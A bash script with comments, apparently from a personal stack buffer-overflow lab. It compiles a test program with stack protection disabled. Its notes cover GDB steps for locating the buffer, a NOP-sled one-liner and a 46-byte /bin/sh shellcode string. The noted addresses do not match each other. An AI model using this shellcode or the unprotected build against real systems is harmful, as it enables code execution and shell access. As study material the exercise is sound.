#!/bin/bash

#chmod +x compile

gcc -g bufferOverflow.c -o exploitMe -fno-stack-protector

#-g for debbuging info in GDB
#fno-stack-protector turns off the default guard checks for stack smashing

# GBD Notes
# list - view code
# disas main - view machine code of program
# run <var1> - to run program

# find start of buffer in memory - disas main, locate strcpy call and get address of instruction below addr
# 0x00005555555546c9
# add breakpoint to this in GDB - break *0x00000000000006c2

# examine memory at break point
    # x/200xb $esp
        # x=examine
        # 200= memory areas
        # x= hex
        # b=byte
        # esp = stack pointer

# info registers - shows register values

# run $(python3 -c 'print("\x90" * 499)')    no-op sled then add machine specific exploit


# Shell exploit (46 bytes):
# \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68